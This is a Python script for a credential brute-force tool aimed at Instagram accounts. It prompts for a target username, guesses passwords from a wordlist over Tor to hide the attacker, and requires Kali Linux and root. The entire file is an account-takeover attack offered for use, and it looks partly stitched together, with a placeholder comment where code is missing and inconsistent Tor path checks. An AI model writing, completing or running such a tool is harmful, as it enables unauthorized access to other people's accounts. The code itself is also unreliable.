import os
import time
import urllib
import argparse
import threading
import subprocess
from platform import platform
from Core.tor import TorManager
from Core.Browser import Browser
from concurrent.futures import ThreadPoolExecutor

class Instagram(TorManager, Browser):
    # Previous code remains unchanged

    # Add user input method for username
    @staticmethod
    def get_target_username():
        username = input("Enter the username of the target: ")
        return username

    # Code for password guessing and handling
    def guess_passwords(self, passwords):
        for pwd in passwords:
            with self.lock:
                self.tries += 1
                self.createBrowser()
                html = self.login(pwd)
                self.deleteBrowser()

                if html and all([self.form1 not in html, self.form2 not in html]):
                    self.isFound = True
                    self.kill(pwd)
                    self.passlist.remove(pwd)

    def run(self):
        self.display()
        with ThreadPoolExecutor(max_workers=10) as executor:
            executor.submit(self.setup_passwords)
            while self.alive:
                if not self.passlist:
                    self.alive = False
                executor.submit(self.guess_passwords, self.passlist)

    # Additional method to start the attack and manage user input
    @staticmethod
    def main():
        engine = Instagram(Instagram.get_target_username(), "wordlist.txt")

        # Handling Tor installation
        try:
            if not os.path.exists('/usr/bin/tor'):
                engine.installTor()
        except Exception as e:
            engine.kill(f"Error: {e}")

        # Additional error handling and logic
        if not os.path.exists('/usr/sbin/tor'):
            engine.kill('Please Install Tor')

        if not engine.exists(engine.username):
            engine.kill(f"The Account '{engine.username}' does not exist")

        try:
            engine.run()
        except Exception as e:
            engine.kill(f"Error during attack: {e}")

if __name__ == '__main__':
    if 'kali' not in platform().lower():
        exit('Kali Linux required')

    if os.getuid():
        exit('Root access required')
    else:
        Instagram.main()
